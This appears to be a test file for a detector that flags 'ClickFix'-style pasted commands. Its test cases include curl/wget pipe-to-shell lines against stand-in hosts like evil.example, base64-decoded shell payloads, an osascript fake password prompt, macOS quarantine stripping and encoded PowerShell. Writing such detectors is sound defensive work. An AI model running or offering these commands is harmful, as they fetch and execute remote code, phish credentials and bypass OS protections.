import { describe, expect, it } from 'vitest';

import { CLICKFIX_MAX_INSPECT, clickFixPreview, matchClickFixCommand } from './clickfix';

describe('matchClickFixCommand', () => {
  it.each([
    ['curl -fsSL https://evil.example/install.sh | bash', 'pipe-to-shell'],
    ['/bin/bash -c "$(curl -fsSL https://evil.example/x)"', 'pipe-to-shell'],
    ['wget -qO- http://203.0.113.9/p | sudo zsh', 'pipe-to-shell'],
    ['curl https://cdn.example/a.sh|/bin/bash', 'pipe-to-shell'],
    ['echo Y3VybCBodHRwOi8vZXZpbA== | base64 -d | bash', 'base64-decode'],
    ['echo Y3VybCBodHRwOi8vZXZpbA== | base64 --decode > /tmp/a', 'base64-decode'],
    ['osascript -e \'display dialog "Enter your password" default answer ""\'', 'osascript'],
    ['xattr -d com.apple.quarantine /Applications/Fake.app', 'quarantine-strip'],
    ['xattr -r -d com.apple.quarantine ~/Downloads/x', 'quarantine-strip'],
    ['xattr -cr /tmp/payload', 'quarantine-strip'],
    ['powershell -enc SQBFAFgA', 'powershell-encoded'],
  ])('flags %s', (text, reason) => {
    expect(matchClickFixCommand(text)?.reason).toBe(reason);
  });

  it.each([
    '',
    'https://example.com/docs?q=curl',
    'Use curl to download the file, then open it.',
    'xattr -p com.apple.quarantine file.dmg',
    'npm install left-pad',
    'git clone https://github.com/example/repo.git',
    'The bash shell is the default on most Linux systems.',
  ])('leaves %j alone', (text) => {
    expect(matchClickFixCommand(text)).toBeNull();
  });

  it('only inspects the head of a huge paste', () => {
    const text = `${'a'.repeat(CLICKFIX_MAX_INSPECT)} curl http://x | sh`;
    expect(matchClickFixCommand(text)).toBeNull();
  });

  it('previews a single line, never the whole payload', () => {
    const preview = clickFixPreview(`curl -s https://evil.example/${'x'.repeat(300)}\n| bash`);
    expect(preview).not.toContain('\n');
    expect(preview.length).toBeLessThanOrEqual(96);
    expect(preview.endsWith('…')).toBe(true);
  });
});
